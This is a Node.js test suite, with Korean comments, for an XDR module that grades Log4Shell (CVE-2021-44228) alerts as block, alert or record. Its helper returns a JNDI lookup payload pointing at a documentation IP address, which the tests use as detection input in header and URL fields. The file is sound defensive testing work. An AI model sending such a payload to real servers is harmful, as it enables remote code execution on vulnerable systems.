import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { test } from 'node:test';
import * as moduleExports from '../xdr/known-cve/decide.mjs';

const fixtureURL = new URL('../xdr/fixtures/known-cve.json', import.meta.url);
const patternsURL = new URL('../xdr/known-cve/patterns.json', import.meta.url);
const decideURL = new URL('../xdr/known-cve/decide.mjs', import.meta.url);
const { decide } = moduleExports;

function expectedAction(confidence) {
  return confidence >= 0.85 ? 'block' : confidence >= 0.5 ? 'alert' : 'record';
}

function docLookup() {
  // 외부 시스템에 연결하지 않는 문서용 문자열입니다.
  return '${jndi:ldap://203.0.113.9/x}';
}

function sample({ url = '/search', useragent = 'class-browser', level = 12, mitre = ['T1190'], description = 'CVE-2021-44228 관련 원격 조회 경보' } = {}) {
  return { timestamp: '2026-09-27T09:14:02+09:00', rule: { level, description, mitre }, data: { srcip: '192.0.2.42', url, useragent } };
}

test('패턴 3개는 patterns.json과 내용이 같고 격리 심판에서 독립 실행된다', async () => {
  const [{ patterns }, source] = await Promise.all([
    readFile(patternsURL, 'utf8').then(JSON.parse),
    readFile(decideURL, 'utf8'),
  ]);
  const embedded = source.match(/const PATTERNS = Object\.freeze\((\[[\s\S]*?\])\.map\(/u);
  assert.ok(embedded, '패턴 3개를 파일 맨 위에 옮겨 적어야 합니다');
  assert.deepEqual(JSON.parse(embedded[1]), patterns);
  assert.deepEqual(Object.keys(moduleExports), ['decide']);
  assert.equal(typeof decide, 'function');
  assert.doesNotMatch(source, /\bimport\s*(?:[{*'"(]|\w+\s+from\b)/u);
  assert.doesNotMatch(source, /\b(?:require|fetch|readFile|writeFile|process|globalThis|XMLHttpRequest)\b/u);
});

test('교육용 경보 24건은 명확 8·애매 8·정상 8로 나뉜다', async () => {
  const fixture = JSON.parse(await readFile(fixtureURL, 'utf8'));
  assert.equal(fixture.moduleKey, 'known-cve');
  assert.equal(fixture.alerts.length, 24);
  const names = new Set((JSON.parse(await readFile(patternsURL, 'utf8'))).patterns.map(p => p.name));
  const counts = { block: 0, alert: 0, record: 0 };
  for (const alert of fixture.alerts) {
    const original = JSON.stringify(alert);
    const result = decide(alert);
    assert.ok(result && typeof result === 'object' && !Array.isArray(result));
    assert.deepEqual(Object.keys(result), ['action', 'confidence', 'reason']);
    assert.ok(Number.isFinite(result.confidence) && result.confidence >= 0 && result.confidence <= 1);
    assert.equal(result.action, expectedAction(result.confidence));
    assert.equal(typeof result.reason, 'string');
    assert.ok(result.reason && !/[\r\n\u2028\u2029]/u.test(result.reason));
    assert.ok(names.has(result.reason) || result.reason === '일치하는 근거 패턴 없음');
    assert.ok(!result.reason.includes(alert.data.srcip));
    assert.equal(JSON.stringify(alert), original, `${alert.id} 원본 수정 금지`);
    const index = Number(alert.id.slice(-2));
    assert.equal(result.action, index <= 8 ? 'block' : index <= 16 ? 'alert' : 'record', `${alert.id} 분류 오류`);
    counts[result.action]++;
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
});

test('머리글·URL 인자의 완전한 조회는 차단하지만 단어·검색어만으로 차단하지 않는다', () => {
  assert.equal(decide(sample({ useragent: docLookup() })).action, 'block');
  assert.equal(decide(sample({ url: `/search?q=${docLookup()}` })).action, 'block');
  assert.equal(decide(sample({ url: `/search?q=${encodeURIComponent(docLookup())}` })).action, 'block');
  assert.equal(decide(sample({ url: '/search?q=CVE-2021-44228' })).action, 'alert');
  assert.equal(decide(sample({ url: '/search?q=jndi-class-note' })).action, 'alert');
  assert.notEqual(decide(sample({ url: '/search?q=lookup-fragment' })).action, 'block');
});

test('T1190·규칙 수준 등 보강 증거가 부족하면 완전한 구문이어도 차단하지 않는다', () => {
  assert.equal(decide(sample({ useragent: docLookup(), mitre: [], description: '단순 로그 확인' })).action, 'alert');
  assert.equal(decide(sample({ useragent: docLookup(), level: 6 })).action, 'alert');
  assert.equal(decide(sample({ useragent: 'class-browser', level: 3, mitre: [], description: '일반 로그인' })).action, 'record');
  assert.equal(decide(sample({ useragent: 'class-browser', level: 12, mitre: [], description: 'CVE-2021-44228 읽기' })).action, 'record');
});

test('누락되거나 변형된 경보는 오류 없이 기록으로 처리한다', () => {
  for (const value of [null, undefined, 3, '', [], {}, { rule: {} }, { rule: { level: '13', description: 'CVE-2021-44228' }, data: {} }]) {
    assert.doesNotThrow(() => decide(value));
    assert.equal(decide(value).action, 'record');
  }
});
